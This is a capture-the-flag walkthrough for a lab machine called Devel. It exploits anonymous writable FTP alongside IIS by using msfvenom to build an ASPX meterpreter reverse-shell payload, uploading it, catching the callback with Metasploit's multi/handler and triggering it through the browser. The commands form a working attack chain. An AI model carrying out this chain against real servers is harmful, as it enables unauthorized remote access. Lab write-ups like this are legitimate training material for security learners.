## Devel Walkthrough

Devel is a machine that shows how easily a bad-actor can exploit an FTP server with anonymous log-ins allowed.

### Enumeration

IP Address: 10.129.237.99

Start with an namp scan of the target.

`nmap -T4 -A 10.129.237.99`

The scan found two ports:

Port 21 - An FTP server

Port 80 - IIS

Interestingly, the FTP server allows for anonymous logins. And since IIS is running, this is also a web server.

First, let's check out FTP. You can log into the server with this command:

`ftp 10.129.237.99`

After this you will be prompted for a username, since anonymous login is allowed you can use the anonymous user. When you are prompted for a password, just hit enter and you will be logged into the machine.

We get read/write permisions with the anonymous account. However, we need more information before going further. Navigate to the web server in a browser (be sure to point to port 80). We just the the default IIS splash screen.

### Weaponization 

Since Devel is running IIS in conjunction with the FTP server that we have write permissions to, we can inject an ASPX file. ASPX (Active Server Page Extended) files use scripts to coordinate how a web page behaves. We can use this to our advantage by dropping an ASPX file into the target that provides a reverse shell. To create a ASPX reverse shell file, use this command:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR-IP-ADDRESS LPORT=4444 -f aspx >devel.aspx`

You can run an `ls` command to confirm that the ASPX file is in your current directory:

Now we need to copy the ASPX file onto the FTP server (make sure you are loggged onto the FTP server when running this command).

`put devel.aspx`

Now that the ASPX file is on devel, we need to set up a listening service for the reverse shell to talk to once the ASPX file is ran.There are many ways of doing this, but I like using the multi handler in Metasploit:

`msfconsole`

`use exploit/multi/handler`

`show options`

This module only requires the IP of your machine and the listening port. By default, the port is 4444. If you set the port to something different when you had the ASPX file, change the port to whatever you set it to.

`set LHOST YOUR-IP-ADDRESS`

Now the last thing we need is a payload. Since we used windows/meterpreter/reverse_tcp when we made the ASPX file, we will use it again here.

`set payload windows/meterpreter/reverse_tcp`

Now you can run the exploit:

It might not look like it is doing anything, but what we have done is we started listening for a response on port 4444. We just need to run the ASPX file now.

Navigate to 10.129.237.99/devel.aspx in a web browser to open the reverse shell:

You wonâ€™t see anything here, but if you go back to your Metasploit session you will now have access to the machine:
